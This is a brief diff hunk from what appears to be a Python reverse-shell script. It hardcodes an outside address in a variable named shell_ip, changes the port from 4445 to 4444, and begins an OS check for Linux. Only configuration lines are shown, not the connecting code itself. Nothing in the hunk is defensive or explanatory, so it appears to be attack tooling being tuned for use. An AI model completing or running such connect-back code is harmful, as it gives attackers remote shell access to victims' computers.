@@ -5,7 +5,7 @@ import os
 
 operating = platform.system()
 shell_ip = "141.55.35.137"
-port = 4445
+port = 4444
 
 
 if operating == "Linux":
